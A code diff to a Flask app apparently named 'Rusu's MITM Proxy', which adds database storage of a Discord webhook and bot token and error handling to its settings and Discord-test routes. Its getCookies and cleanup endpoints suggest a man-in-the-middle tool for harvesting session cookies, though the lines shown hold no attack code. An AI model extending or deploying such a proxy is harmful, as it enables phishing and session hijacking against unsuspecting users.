@@ -101,19 +101,34 @@ def start_proxy(target, host, port, secret):
     @app.route('/ep/api/settings', methods=['GET', 'POST'])
     def handle_settings():
         global discord_bot
+        
         if request.method == 'POST':
             data = request.json
-            if 'discord_webhook' in data:
-                discord_bot = DiscordBot(data['discord_webhook'])
-                # Test the webhook
-                discord_bot.send_webhook({
-                    "content": "🔔 Webhook configured successfully!"
-                })
-            return jsonify({'status': 'success'}), 200
+            webhook = data.get('discord_webhook', '')
+            token = data.get('discord_token', '')
+            
+            try:
+                # Save to database
+                db.save_discord_settings(webhook, token)
+                
+                # Update discord bot
+                if webhook and token:
+                    discord_bot = DiscordBot(webhook, token)
+                    
+                return jsonify({
+                    'status': 'success',
+                    'message': 'Settings saved successfully'
+                }), 200
+                
+            except Exception as e:
+                return jsonify({
+                    'status': 'error',
+                    'message': str(e)
+                }), 500
         else:
-            return jsonify({
-                'discord_webhook': discord_bot.webhook_url if discord_bot else ''
-            }), 200
+            # Get settings from database
+            settings = db.get_discord_settings()
+            return jsonify(settings), 200
 
     @app.route('/ep/api/getCookies', methods=['GET'])
     def get_cookies():
@@ -177,12 +192,22 @@ def start_proxy(target, host, port, secret):
 
     @app.route('/ep/api/test_discord', methods=['POST'])
     def test_discord():
-        if discord_bot.webhook_url:
-            success = discord_bot.send_webhook({
-                "content": "🔔 Test notification from Rusu's MITM Proxy"
+        if not discord_bot:
+            return jsonify({
+                'status': 'error',
+                'message': 'Discord bot not configured'
+            }), 400
+        
+        try:
+            discord_bot.send_webhook({
+                "content": "🔔 Discord integration test successful!"
             })
-            return jsonify({'status': 'success' if success else 'error'}), 200
-        return jsonify({'status': 'error', 'message': 'No webhook URL configured'}), 400
+            return jsonify({'status': 'success'}), 200
+        except Exception as e:
+            return jsonify({
+                'status': 'error',
+                'message': str(e)
+            }), 500
 
     @app.route('/ep/api/cleanup', methods=['POST'])
     def cleanup_data():
